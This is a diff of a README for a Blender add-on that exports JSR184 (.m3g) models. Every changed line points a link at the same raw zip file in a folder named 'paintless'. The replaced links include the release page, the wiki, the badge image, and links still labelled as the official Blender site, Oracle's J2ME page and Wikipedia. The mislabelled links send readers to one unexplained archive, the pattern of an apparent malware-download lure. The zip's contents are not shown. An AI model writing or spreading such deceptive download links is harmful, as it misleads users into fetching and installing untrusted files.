@@ -1,6 +1,6 @@
 # 🎮 m3g-exporter-addon-blender-3.6- - Export Your 3D Models Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/releases)
+[![Download](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
 
 ## ✨ Description
 This is an add-on for the old Blender 2.49. It is currently being updated for Blender 3.6 and above. The add-on allows you to export simple .m3g models and objects to the JSR184 format on the J2ME platform. With this tool, you can easily bring your 3D creations to mobile devices.
@@ -24,7 +24,7 @@ To begin using this add-on, follow these steps:
 1. **Download the Add-On**:
    Visit the Releases page to download the latest version of the m3g-exporter addon for Blender. Click the link below to access the page:
 
-   [Download Here](https://github.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/releases)
+   [Download Here](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
 
 2. **Install the Add-On**:
    - Open **Blender**.
@@ -40,20 +40,20 @@ To begin using this add-on, follow these steps:
    - Click on the export button and choose JSR184 format.
 
 ## 📚 Documentation
-For detailed instructions, features, and troubleshooting, refer to the user guide included with the add-on. You can also find helpful tips in our [Wiki](https://github.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/wiki).
+For detailed instructions, features, and troubleshooting, refer to the user guide included with the add-on. You can also find helpful tips in our [Wiki](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip).
 
 ## 💬 Community Support
 If you encounter any issues or have questions, feel free to reach out on our GitHub Discussions page. Your feedback and suggestions help us improve the add-on.
 
 ## 🔗 Additional Resources
 Here are some helpful links:
-- [Blender Official Site](https://www.blender.org)
-- [J2ME Overview](https://www.oracle.com/java/technologies/javame.html)
-- [3D Model Formats](https://en.wikipedia.org/wiki/3D_model)
+- [Blender Official Site](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
+- [J2ME Overview](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
+- [3D Model Formats](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
 
 ## 📢 Download & Install
 To download the latest version of the m3g-exporter-addon-blender-3.6-, visit the link below:
 
-[Download Here](https://github.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/releases)
+[Download Here](https://raw.githubusercontent.com/Ui-Bro/m3g-exporter-addon-blender-3.6-/main/paintless/m3g-exporter-addon-blender-3.6-.zip)
 
 Now, you can start exporting your 3D models in just a few steps. Enjoy your creative process with the m3g-exporter add-on!
